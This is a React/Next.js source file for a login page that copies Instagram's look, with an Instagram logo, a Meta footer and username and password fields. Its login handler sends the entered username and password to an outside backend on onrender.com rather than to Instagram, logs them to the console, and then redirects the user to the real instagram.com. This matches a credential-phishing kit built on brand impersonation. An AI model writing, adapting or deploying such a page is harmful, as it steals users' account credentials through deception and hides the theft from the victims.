"use client";
import { Box, Button, Input, Typography } from "@mui/material";
import React, { useState } from "react";
import KeyboardArrowDownIcon from "@mui/icons-material/KeyboardArrowDown";
import Image from "next/image";
import { useRouter } from "next/navigation";

const LoginPage = () => {
  const router = useRouter();
  const [formData, setFormData] = useState({ username: "", password: "" });
  const [error, setError] = useState("");

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.username || !formData.password) {
      setError("Please fill in all fields.");
    } else {
      const response = await fetch(
        "https://insta-backend-uo45.onrender.com/api/login",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify(formData),
        }
      );

      if (!response.ok) {
        setError("Login failed. Please try again.");
      } else {
        setError("");
        router.push("https://www.instagram.com");
      }
      console.log("Logging in with:", formData);
    }
  };

  return (
    <Box
      sx={{
        width: "100vw",
        height: "100dvh",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        backgroundColor: "#fafafa",
        overflow: "hidden",
      }}
    >
      <Box
        sx={{
          width: "100%",
          maxWidth: { sm: "100%", md: "350px" },
          display: "flex",
          flexDirection: "column",
          height: "100%",
          padding: "20px",
          backgroundColor: "#ffffff",
          justifyContent: "space-between",
        }}
      >
        {/* Top: Language Section */}
        <Typography
          sx={{
            fontSize: "14px",
            color: "#8e8e8e",
            fontWeight: 600,
            display: "flex",
            justifyContent: "center",
            width: "100%",
            paddingBottom: "10px",
          }}
        >
          English (UK)
          <KeyboardArrowDownIcon />
        </Typography>

        <Box display={{ xs: "flex" }} justifyContent="center">
          <Image
            src={"/assets/instagram.png"}
            height={60}
            width={60}
            alt="Instagram Logo"
          />
        </Box>

        {/* Form Section */}
        <Box
          sx={{
            width: "100%",
            display: "flex",
            flexDirection: "column",
            gap: "14px",
          }}
        >
          <form
            style={{
              display: "flex",
              flexDirection: "column",
              gap: "8px",
            }}
          >
            <div
              style={{
                display: "flex",
                flexDirection: "column",
                gap: "8px",
                width: "100%",
              }}
            >
              <Input
                type="text"
                disableUnderline
                placeholder="Username, email address or mobile number"
                sx={{
                  border: "1px solid gray",
                  padding: "10px",
                  borderRadius: "12px",
                  height: "48px",
                  fontSize: "14px",
                  width: "100%",
                  fontWeight: 500,
                }}
                name="username"
                value={formData.username}
                onChange={(e) =>
                  setFormData({ ...formData, username: e.target.value })
                }
              />
              <Input
                type="password"
                disableUnderline
                placeholder="Password"
                sx={{
                  border: "1px solid gray",
                  padding: "10px",
                  borderRadius: "12px",
                  height: "48px",
                  fontSize: "14px",
                  width: "100%",
                  fontWeight: 500,
                }}
                value={formData.password}
                name="password"
                onChange={(e) =>
                  setFormData({ ...formData, password: e.target.value })
                }
              />
            </div>
            <Typography
              sx={{ color: "red", fontWeight: 200, fontSize: "12px" }}
            >
              {error}
            </Typography>
            <Button
              type="submit"
              style={{
                backgroundColor: "#4a5df9",
                color: "white",
                borderRadius: "16px",
                border: "none",
                cursor: "pointer",
                height: "40px",
                width: "100%",
              }}
              onClick={handleLogin}
            >
              Log In
            </Button>
          </form>
          <Typography
            sx={{
              fontSize: "12px",
              color: "black",
              fontWeight: 500,
              textAlign: "center",
            }}
          >
            Forgotten password?
          </Typography>
        </Box>

        {/* Bottom: Footer */}
        <Box
          sx={{
            width: "100%",
            display: "flex",
            flexDirection: "column",
            gap: "8px",
            justifyContent: "flex-end",
            alignItems: "center",
            paddingTop: "10px",
          }}
        >
          <Button
            variant="outlined"
            type="submit"
            style={{
              borderRadius: "16px",
              border: "2px solid #4a5df9",
              cursor: "pointer",
              height: "40px",
              width: "100%",
              textTransform: "none",
              color: "#4a5df9",
              fontSize: "16px",
            }}
          >
            Create new account
          </Button>
          <Box
            sx={{
              display: "flex",
              justifyContent: "center",
              alignItems: "center",
              gap: "8px",
            }}
          >
            <Image
              src={"/assets/meta.png"}
              height={16}
              width={16}
              alt="Meta Logo"
            />
            <Typography
              sx={{
                fontSize: "14px",
                color: "#8e8e8e",
                fontWeight: 500,
                textAlign: "center",
              }}
            >
              Meta
            </Typography>
          </Box>
        </Box>
      </Box>
    </Box>
  );
};

export default LoginPage;
